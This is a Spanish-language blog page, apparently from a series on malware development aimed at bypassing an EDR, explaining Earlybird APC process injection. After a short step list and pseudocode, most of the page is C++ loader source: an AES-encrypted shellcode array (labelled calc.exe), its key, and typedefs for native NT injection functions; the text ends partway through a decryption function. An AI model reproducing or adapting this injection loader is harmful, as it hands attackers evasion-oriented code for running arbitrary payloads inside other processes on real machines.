<!DOCTYPE html>
<html lang="en-US">
  <head>
    <meta charset='utf-8'>
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" href="/assets/css/style.css?v=">
    <!-- start custom head snippets, customize with your own _includes/head-custom.html file -->

<!-- Setup theme-color -->
<!-- start theme color meta headers -->
<meta name="theme-color" content="#151515">
<meta name="msapplication-navbutton-color" content="#151515">
<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
<!-- end theme color meta headers -->


<!-- Setup Google Analytics -->



<!-- You can set your favicon here -->
<!-- link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" -->

<!-- end custom head snippets -->


<!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Bypaseando mis limitaciones | El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</title>
<meta name="generator" content="Jekyll v4.3.2" />
<meta property="og:title" content="Bypaseando mis limitaciones" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<meta property="og:description" content="El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR" />
<link rel="canonical" href="http://localhost:4000/Earlybird.html" />
<meta property="og:url" content="http://localhost:4000/Earlybird.html" />
<meta property="og:site_name" content="Bypaseando mis limitaciones" />
<meta property="og:type" content="website" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Bypaseando mis limitaciones" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"WebPage","description":"El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR","headline":"Bypaseando mis limitaciones","url":"http://localhost:4000/Earlybird.html"}</script>
<!-- End Jekyll SEO tag -->

  </head>

  <body>

    <header>
      <div class="container">
        <a id="a-title" href="/">
          <h1>Bypaseando mis limitaciones</h1>
        </a>
        <h2>El blog se centra en el aprendizaje del desarrollo de malware con el objetivo final de realizar bypass de un EDR</h2>

        <section id="downloads">
          
            <a href="" class="btn">Download as .zip</a>
            <a href="" class="btn">Download as .tar.gz</a>
          
          <a href="" class="btn btn-github"><span class="icon"></span>View on GitHub</a>
        </section>
      </div>
    </header>

    <div class="container">
      <section id="main_content">
        <h1 id="inyección-earlybird">Inyección Earlybird</h1>

<p>La característica principal de este tipo de inyeción, se centra en el concepto de que no es necesaria la busqueda de un proceso en el Sistema Operativo. Ya que, el propio binario se encargará de crearlo.
El flujo de ejecución, será el siguiente:</p>
<ul>
  <li>El binario malicioso, crea un nuevo proceso en modo suspensión obteniendo el identificador de proceso y el identificacor del hilo.</li>
  <li>El binario malicioso, reserva buffer de memoria en el espacio de memoria del proceso creado.</li>
  <li>El binario malicioso, se encarga de escribir el shellcode en el buffer reservado.</li>
  <li>El binario malicioso, utiliza una llamada APC (Asynchronous Process Call) para encolar una llamada, en la que invoca al hilo remoto para la ejecución del shellcode.</li>
  <li>Se resume el hilo remoto que hace que que hilo entre en <code class="language-plaintext highlighter-rouge">estado de alerta</code> y consuma la llamada asincrona remota encolada que hace que se ejecute el shellcode desde la posiciñon de memoria del buffer reservado.</li>
</ul>

<p><code class="language-plaintext highlighter-rouge">Este tipo de inyección, cubre parte de las anteriores y será la dirección que tomemos a la hora de realiza  el bypass del EDR.</code></p>

<h2 id="diagrama-de-flujo">Diagrama de flujo</h2>

<p><img src="/assets/images/earlybird_diagram.png" alt="Earlybird diagram" /></p>

<h2 id="pseudo-codigo">Pseudo-codigo</h2>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 1. Creamos un nuevo proceso en el sistema operativo, en estado suspendido</span>
<span class="n">PROCESS_INFORMATION</span> <span class="n">pi</span>
<span class="n">CreateProcessA</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="s">"notepad.exe"</span><span class="p">,</span> <span class="p">...,</span> <span class="n">CREATE_SUSPENDED</span><span class="p">,</span> <span class="p">...,</span> <span class="o">&amp;</span><span class="n">pi</span><span class="p">)</span>

<span class="c1">// 2. Reservamos memoria para nuestro shellcode en el mapa de memoria del nuevo proceso remoto</span>
<span class="n">pRemoteCode</span> <span class="o">=</span> <span class="n">VirtualAllocEx</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,...,</span> <span class="n">BufferSize</span><span class="p">,...,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>

<span class="c1">// 3. Escribimos nuestro payload en el buffer reservado</span>
<span class="n">WriteProcessMemory</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hProcess</span><span class="p">,</span> <span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">Shellcode</span><span class="p">,</span> <span class="n">ShellcodeSize</span><span class="p">,...)</span>

<span class="c1">// 4. Realizamos una invocación en APC</span>
<span class="n">QueueUserAPC</span><span class="p">(</span><span class="n">pRemoteCode</span><span class="p">,</span> <span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">)</span>

<span class="c1">// 5. Lanzamos un hilo de nuestro proceso apra que se ejecute el shellcode</span>
<span class="n">ResumeThread</span><span class="p">(</span><span class="n">pi</span><span class="p">.</span><span class="n">hThread</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="codigo-fuente">Codigo fuente</h2>

<div class="language-c++ highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include</span> <span class="cpf">&lt;winternl.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;tlhelp32.h&gt;</span><span class="cp">
#include</span> <span class="cpf">&lt;wincrypt.h&gt;</span><span class="cp">
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
</span>
<span class="c1">// calc.exe</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">payload</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x9d</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x52</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x99</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x35</span><span class="p">,</span> <span class="mh">0x14</span><span class="p">,</span> <span class="mh">0xd</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x74</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0x6c</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0x72</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xfa</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x3b</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0xa0</span><span class="p">,</span> <span class="mh">0xd2</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0xb</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0xfb</span><span class="p">,</span> <span class="mh">0x10</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x79</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0x4c</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0xf3</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x28</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0x65</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x43</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x12</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0x55</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xa8</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x11</span><span class="p">,</span> <span class="mh">0xcb</span><span class="p">,</span> <span class="mh">0xc8</span><span class="p">,</span> <span class="mh">0x68</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0x94</span><span class="p">,</span> <span class="mh">0xfd</span><span class="p">,</span> <span class="mh">0xb2</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x84</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x6e</span><span class="p">,</span> <span class="mh">0xd5</span><span class="p">,</span> <span class="mh">0x38</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x80</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xf8</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x63</span><span class="p">,</span> <span class="mh">0xb6</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0x85</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0x8</span><span class="p">,</span> <span class="mh">0xe3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0x1e</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0x1</span><span class="p">,</span> <span class="mh">0x39</span><span class="p">,</span> <span class="mh">0xca</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0xd3</span><span class="p">,</span> <span class="mh">0xd8</span><span class="p">,</span> <span class="mh">0x8d</span><span class="p">,</span> <span class="mh">0x83</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xa4</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x1b</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0xc6</span><span class="p">,</span> <span class="mh">0x86</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xb9</span><span class="p">,</span> <span class="mh">0xd9</span><span class="p">,</span> <span class="mh">0x5d</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x1d</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0xf6</span><span class="p">,</span> <span class="mh">0x62</span><span class="p">,</span> <span class="mh">0x54</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x87</span><span class="p">,</span> <span class="mh">0x4</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xd6</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0xf4</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xfc</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0xa3</span><span class="p">,</span> <span class="mh">0xc3</span><span class="p">,</span> <span class="mh">0xe</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x1a</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x9c</span><span class="p">,</span> <span class="mh">0x41</span><span class="p">,</span> <span class="mh">0xd4</span><span class="p">,</span> <span class="mh">0xa7</span><span class="p">,</span> <span class="mh">0x31</span><span class="p">,</span> <span class="mh">0x5e</span><span class="p">,</span> <span class="mh">0x7d</span><span class="p">,</span> <span class="mh">0x37</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0xec</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x9a</span><span class="p">,</span> <span class="mh">0x24</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0x2c</span><span class="p">,</span> <span class="mh">0x71</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span> <span class="mh">0x4f</span><span class="p">,</span> <span class="mh">0x4b</span><span class="p">,</span> <span class="mh">0x19</span><span class="p">,</span> <span class="mh">0xf1</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x66</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x6d</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0x16</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0x8b</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x56</span><span class="p">,</span> <span class="mh">0xbd</span><span class="p">,</span> <span class="mh">0xe6</span><span class="p">,</span> <span class="mh">0x6a</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0xf9</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8a</span><span class="p">,</span> <span class="mh">0xa1</span><span class="p">,</span> <span class="mh">0x5b</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x1c</span><span class="p">,</span> <span class="mh">0x2</span><span class="p">,</span> <span class="mh">0x53</span><span class="p">,</span> <span class="mh">0xb3</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x2b</span><span class="p">,</span> <span class="mh">0xcc</span><span class="p">,</span> <span class="mh">0xae</span><span class="p">,</span> <span class="mh">0x4d</span><span class="p">,</span> <span class="mh">0x7a</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x0</span><span class="p">,</span> <span class="mh">0xa</span><span class="p">,</span> <span class="mh">0x47</span><span class="p">,</span> <span class="mh">0xbb</span><span class="p">,</span> <span class="mh">0x33</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x1f</span><span class="p">,</span> <span class="mh">0x32</span><span class="p">,</span> <span class="mh">0xba</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xf7</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x5</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xc5</span><span class="p">,</span> <span class="mh">0xe4</span><span class="p">,</span> <span class="mh">0x4e</span><span class="p">,</span> <span class="mh">0xdf</span><span class="p">,</span> <span class="mh">0x57</span><span class="p">,</span> <span class="mh">0xd1</span><span class="p">,</span> <span class="mh">0x69</span><span class="p">,</span> <span class="mh">0xa9</span><span class="p">,</span> <span class="mh">0x96</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xde</span><span class="p">,</span> <span class="mh">0x3d</span><span class="p">,</span> <span class="mh">0x26</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x6</span><span class="p">,</span> <span class="mh">0xe0</span><span class="p">,</span> <span class="mh">0x46</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0x23</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0x7e</span><span class="p">,</span> <span class="mh">0xe2</span><span class="p">,</span> <span class="mh">0xa2</span><span class="p">,</span> <span class="mh">0x3c</span><span class="p">,</span> <span class="mh">0x2a</span><span class="p">,</span> <span class="mh">0x92</span><span class="p">,</span> <span class="mh">0xe5</span><span class="p">,</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x81</span><span class="p">,</span> <span class="mh">0x7c</span><span class="p">,</span> <span class="mh">0x42</span><span class="p">,</span> <span class="mh">0x61</span><span class="p">,</span> <span class="mh">0x3</span><span class="p">,</span> <span class="mh">0xac</span><span class="p">,</span> <span class="mh">0xdc</span><span class="p">,</span> <span class="mh">0x91</span><span class="p">,</span> <span class="mh">0x8f</span> <span class="p">};</span>
<span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">payload</span><span class="p">);</span>
<span class="kt">unsigned</span> <span class="kt">char</span> <span class="n">key</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span> <span class="mh">0x95</span><span class="p">,</span> <span class="mh">0x21</span><span class="p">,</span> <span class="mh">0x49</span><span class="p">,</span> <span class="mh">0x58</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="mh">0xe8</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x36</span><span class="p">,</span> <span class="mh">0x29</span><span class="p">,</span> <span class="mh">0x22</span><span class="p">,</span> <span class="mh">0x93</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">,</span> <span class="mh">0x25</span><span class="p">,</span> <span class="mh">0xc3</span> <span class="p">};</span>

<span class="c1">// http://undocumented.ntinternals.net/UserMode/Undocumented%20Functions/Executable%20Images/RtlCreateUserThread.html</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_CLIENT_ID</span> <span class="p">{</span>
	<span class="n">HANDLE</span> <span class="n">UniqueProcess</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">UniqueThread</span><span class="p">;</span>
<span class="p">}</span> <span class="n">CLIENT_ID</span><span class="p">,</span> <span class="o">*</span><span class="n">PCLIENT_ID</span><span class="p">;</span>

<span class="k">typedef</span> <span class="nf">LPVOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">VirtualAlloc_t</span><span class="p">)(</span>
	<span class="n">LPVOID</span> <span class="n">lpAddress</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">dwSize</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flAllocationType</span><span class="p">,</span>
	<span class="n">DWORD</span>  <span class="n">flProtect</span><span class="p">);</span>
	
<span class="k">typedef</span> <span class="nf">VOID</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlMoveMemory_t</span><span class="p">)(</span>
	<span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Destination</span><span class="p">,</span> 
	<span class="k">const</span> <span class="n">VOID</span> <span class="n">UNALIGNED</span> <span class="o">*</span><span class="n">Source</span><span class="p">,</span> 
	<span class="n">SIZE_T</span> <span class="n">Length</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">FARPROC</span> <span class="p">(</span><span class="n">WINAPI</span> <span class="o">*</span> <span class="n">RtlCreateUserThread_t</span><span class="p">)(</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PSECURITY_DESCRIPTOR</span> <span class="n">SecurityDescriptor</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">BOOLEAN</span> <span class="n">CreateSuspended</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackReserved</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">OUT</span> <span class="n">PULONG</span> <span class="n">StackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">StartParameter</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">ThreadHandle</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PCLIENT_ID</span> <span class="n">ClientId</span><span class="p">);</span>

<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateThreadEx_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">hThread</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ACCESS_MASK</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">ObjectAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpStartAddress</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PVOID</span> <span class="n">lpParameter</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">Flags</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">StackZeroBits</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackCommit</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">SIZE_T</span> <span class="n">SizeOfStackReserve</span><span class="p">,</span>
	<span class="n">OUT</span> <span class="n">PVOID</span> <span class="n">lpBytesBuffer</span><span class="p">);</span>

<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_UNICODE_STRING</span> <span class="p">{</span>
	<span class="n">USHORT</span> <span class="n">Length</span><span class="p">;</span>
	<span class="n">USHORT</span> <span class="n">MaximumLength</span><span class="p">;</span>
	<span class="n">_Field_size_bytes_part_</span><span class="p">(</span><span class="n">MaximumLength</span><span class="p">,</span> <span class="n">Length</span><span class="p">)</span> <span class="n">PWCH</span> <span class="n">Buffer</span><span class="p">;</span>
<span class="p">}</span> <span class="n">UNICODE_STRING</span><span class="p">,</span> <span class="o">*</span><span class="n">PUNICODE_STRING</span><span class="p">;</span>

<span class="c1">// https://processhacker.sourceforge.io/doc/ntbasic_8h_source.html#l00186</span>
<span class="k">typedef</span> <span class="k">struct</span> <span class="nc">_OBJECT_ATTRIBUTES</span> <span class="p">{</span>
	<span class="n">ULONG</span> <span class="n">Length</span><span class="p">;</span>
	<span class="n">HANDLE</span> <span class="n">RootDirectory</span><span class="p">;</span>
	<span class="n">PUNICODE_STRING</span> <span class="n">ObjectName</span><span class="p">;</span>
	<span class="n">ULONG</span> <span class="n">Attributes</span><span class="p">;</span>
	<span class="n">PVOID</span> <span class="n">SecurityDescriptor</span><span class="p">;</span> <span class="c1">// PSECURITY_DESCRIPTOR;</span>
	<span class="n">PVOID</span> <span class="n">SecurityQualityOfService</span><span class="p">;</span> <span class="c1">// PSECURITY_QUALITY_OF_SERVICE</span>
<span class="p">}</span> <span class="n">OBJECT_ATTRIBUTES</span><span class="p">,</span> <span class="o">*</span><span class="n">POBJECT_ATTRIBUTES</span><span class="p">;</span>

<span class="c1">// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwcreatesection</span>
<span class="c1">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtCreateSection.html</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtCreateSection_t</span><span class="p">)(</span>
	<span class="n">OUT</span> <span class="n">PHANDLE</span> <span class="n">SectionHandle</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">DesiredAccess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">POBJECT_ATTRIBUTES</span> <span class="n">ObjectAttributes</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">PLARGE_INTEGER</span> <span class="n">MaximumSize</span> <span class="n">OPTIONAL</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">PageAttributess</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">ULONG</span> <span class="n">SectionAttributes</span><span class="p">,</span>
	<span class="n">IN</span> <span class="n">HANDLE</span> <span class="n">FileHandle</span> <span class="n">OPTIONAL</span><span class="p">);</span> 

<span class="c1">// https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwmapviewofsection</span>
<span class="c1">// https://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FNtMapViewOfSection.html</span>
<span class="k">typedef</span> <span class="nf">NTSTATUS</span> <span class="p">(</span><span class="n">NTAPI</span> <span class="o">*</span> <span class="n">NtMapViewOfSection_t</span><span class="p">)(</span>
	<span class="n">HANDLE</span> <span class="n">SectionHandle</span><span class="p">,</span>
	<span class="n">HANDLE</span> <span class="n">ProcessHandle</span><span class="p">,</span>
	<span class="n">PVOID</span> <span class="o">*</span> <span class="n">BaseAddress</span><span class="p">,</span>
	<span class="n">ULONG_PTR</span> <span class="n">ZeroBits</span><span class="p">,</span>
	<span class="n">SIZE_T</span> <span class="n">CommitSize</span><span class="p">,</span>
	<span class="n">PLARGE_INTEGER</span> <span class="n">SectionOffset</span><span class="p">,</span>
	<span class="n">PSIZE_T</span> <span class="n">ViewSize</span><span class="p">,</span>
	<span class="n">DWORD</span> <span class="n">InheritDisposition</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">AllocationType</span><span class="p">,</span>
	<span class="n">ULONG</span> <span class="n">Win32Protect</span><span class="p">);</span>
	
<span class="c1">// http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FSection%2FSECTION_INHERIT.html</span>
<span class="k">typedef</span> <span class="k">enum</span> <span class="n">_SECTION_INHERIT</span> <span class="p">{</span>
	<span class="n">ViewShare</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
	<span class="n">ViewUnmap</span> <span class="o">=</span> <span class="mi">2</span>
<span class="p">}</span> <span class="n">SECTION_INHERIT</span><span class="p">,</span> <span class="o">*</span><span class="n">PSECTION_INHERIT</span><span class="p">;</span>	


<span class="kt">int</span> <span class="nf">AESDecrypt</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span> <span class="n">payload</span><span class="p">,</span> <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">payload_len</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span> <span class="n">key</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">keylen</span><span class="p">)</span> <span class="p">{</span>
	<span class="n">HCRYPTPROV</span> <span class="n">hProv</span><span class="p">;</span>
	<span class="n">HCRYPTHASH</span> <span class="n">hHash</span><span class="p">;</span>
